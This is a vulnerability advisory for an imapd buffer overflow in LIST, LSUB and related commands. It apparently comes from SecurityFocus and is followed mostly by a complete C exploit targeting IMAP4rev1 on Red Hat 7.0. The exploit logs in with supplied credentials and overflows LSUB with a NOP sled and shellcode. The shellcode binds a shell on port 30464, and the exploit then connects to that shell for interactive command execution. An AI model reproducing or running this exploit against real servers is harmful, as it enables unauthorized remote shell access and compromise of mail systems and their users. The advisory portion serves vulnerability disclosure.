source: http://www.securityfocus.com/bid/1110/info

A buffer overflow exists in imapd. The vulnerability exists in the list command. By supplying a long, well-crafted string as the second argument to the list command, it becomes possible to execute code on the machine.

Executing the list command requires an account on the machine. In addition, privileges have been dropped in imapd prior to the location of the buffer overrun. As such, this vulnerability would only be useful in a scenario where a user has an account, but no shell level access. This would allow them to gain shell access.

Overflows have also been found in the COPY, LSUB, RENAME and FIND command. All of these, like the LIST command, require a login on the machine. 

/*
------------------------------------------------------------------------------
Web:  http://qb0x.net                           Author: Gabriel A. Maggiotti
Date: Aug 01, 2002                            E-mail: gmaggiot@ciudad.com.ar
------------------------------------------------------------------------------

Redhat 7.0 remote buffer overflow exploit for IMAP4rev1 prior to v10.234


*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>

#define MAX     1200
#define MYPORT   143
#define PORT    30464

#define OFFSET 1080
#define NOP 0x90
#define RET 0xbffd8940 - OFFSET


char shellcode[]=
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\xb0\x02"                      /* movb $0x2,%al         */
        "\xcd\x80"                      /* int $0x80             */
        "\x85\xc0"                      /* testl %eax,%eax       */
        "\x75\x43"                      /* jne 0x43              */
        "\xeb\x43"                      /* jmp 0x43              */
        "\x5e"                          /* popl %esi             */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\x31\xdb"                      /* xorl %ebx,%ebx        */
        "\x89\xf1"                      /* movl %esi,%ecx        */
        "\xb0\x02"                      /* movb $0x2,%al         */
        "\x89\x06"                      /* movl %eax,(%esi)      */
        "\xb0\x01"                      /* movb $0x1,%al         */
        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
        "\xb0\x06"                      /* movb $0x6,%al         */
        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
        "\xb0\x66"                      /* movb $0x66,%al        */
        "\xb3\x01"                      /* movb $0x1,%bl         */
        "\xcd\x80"                      /* int $0x80             */
        "\x89\x06"                      /* movl %eax,(%esi)      */
        "\xb0\x02"                      /* movb $0x2,%al         */
        "\x66\x89\x46\x0c"              /* movw %ax,0xc(%esi)    */
        "\xb0\x77"                      /* movb $0x77,%al        */
        "\x66\x89\x46\x0e"              /* movw %ax,0xe(%esi)    */
        "\x8d\x46\x0c"                  /* leal 0xc(%esi),%eax   */
        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\x89\x46\x10"                  /* movl %eax,0x10(%esi)  */
        "\xb0\x10"                      /* movb $0x10,%al        */
        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
        "\xb0\x66"                      /* movb $0x66,%al        */
        "\xb3\x02"                      /* movb $0x2,%bl         */
        "\xcd\x80"                      /* int $0x80             */
        "\xeb\x04"                      /* jmp 0x4               */
        "\xeb\x55"                      /* jmp 0x55              */
        "\xeb\x5b"                      /* jmp 0x5b              */
        "\xb0\x01"                      /* movb $0x1,%al         */
        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
        "\xb0\x66"                      /* movb $0x66,%al        */
        "\xb3\x04"                      /* movb $0x4,%bl         */
        "\xcd\x80"                      /* int $0x80             */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
        "\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
        "\xb0\x66"                      /* movb $0x66,%al        */
        "\xb3\x05"                      /* movb $0x5,%bl         */
        "\xcd\x80"                      /* int $0x80             */
        "\x88\xc3"                      /* movb %al,%bl          */
        "\xb0\x3f"                      /* movb $0x3f,%al        */
        "\x31\xc9"                      /* xorl %ecx,%ecx        */
        "\xcd\x80"                      /* int $0x80             */
        "\xb0\x3f"                      /* movb $0x3f,%al        */
        "\xb1\x01"                      /* movb $0x1,%cl         */
        "\xcd\x80"                      /* int $0x80             */
        "\xb0\x3f"                      /* movb $0x3f,%al        */
        "\xb1\x02"                      /* movb $0x2,%cl         */
        "\xcd\x80"                      /* int $0x80             */
        "\xb8\x2f\x62\x69\x6e"          /* movl $0x6e69622f,%eax */
        "\x89\x06"                      /* movl %eax,(%esi)      */
        "\xb8\x2f\x73\x68\x2f"          /* movl $0x2f68732f,%eax */
        "\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
        "\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
        "\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
        "\xb0\x0b"                      /* movb $0xb,%al         */
        "\x89\xf3"                      /* movl %esi,%ebx        */
        "\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
        "\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
        "\xcd\x80"                      /* int $0x80             */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\xb0\x01"                      /* movb $0x1,%al         */
        "\x31\xdb"                      /* xorl %ebx,%ebx        */
        "\xcd\x80"                      /* int $0x80             */
        "\xe8\x5b\xff\xff\xff";         /* call -0xa5            */

main(int argc, char *argv[])
{
	int i=0;
	char buf[MAX];
	int sockfd;
    int numbytes;

    struct hostent *he;
    struct sockaddr_in their_addr;

    if(argc!=4)
    {
		fprintf(stderr,"usage:%s <hostname> <user> <pass>\n",argv[0]);
		exit(1);
	}

    if((he=gethostbyname(argv[1]))==NULL)
    {
		perror("gethostbyname");
		exit(1);
	}

	if( (sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1) {
		perror("socket"); exit(1);
	}

	their_addr.sin_family=AF_INET;
	their_addr.sin_port=htons(MYPORT);
	their_addr.sin_addr=*((struct in_addr*)he->h_addr);
	bzero(&(their_addr.sin_zero),8);

	if( connect(sockfd,(struct sockaddr*)&their_addr,\
                 sizeof(struct sockaddr))==-1)
	{
		perror("connect");
		exit(1);
	}

	sprintf(buf,"1 LOGIN %s %s\r\n1 LSUB \"\" {1064}\r\n",argv[2],argv[3]);
	printf("%s",buf);

	for(i=0;i<=OFFSET -1 ;i++)
		buf[i]=NOP;
	for(;i<OFFSET+32;i+=4)
	*(int *) &buf[i] = RET;
//	*(int *) &buf[i+=4] = RET1;
	memcpy(buf+100,shellcode,strlen(shellcode));

    if( send(sockfd,buf,strlen(buf),0) ==-1)
    {
    	perror("send");
        exit(0);
    }

    close(sockfd);

/***************** second connection  ************************/
	sleep(2);

	if( (sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1) {
		perror("socket"); exit(1);
	}

	their_addr.sin_family=AF_INET;
	their_addr.sin_port=htons(PORT);
	their_addr.sin_addr=*((struct in_addr*)he->h_addr);
	bzero(&(their_addr.sin_zero),8);

	if( connect(sockfd,(struct sockaddr*)&their_addr,\
                 sizeof(struct sockaddr))==-1)
    {
   		 perror("connect");
    	 exit(1);
    }

   	printf("sh> ");
	while(1)
	{
		buf[0]='\0';
		fgets(buf,MAX-1,stdin);
		sprintf(buf,"%s \n",buf);
		//printf("%s\n",buf);
        if( send(sockfd,buf,strlen(buf),0) ==-1)
        {
                perror("send");
                exit(0);
        }

		buf[0]='\0';
        if( (numbytes=recv(sockfd,buf,MAX,0))==-1 ) {
	            perror("recv");
	            exit(1);
	        }

        buf[numbytes]='\0';
       	printf("%s\nsh> ",buf);

	}
    close(sockfd);

return 0;
}
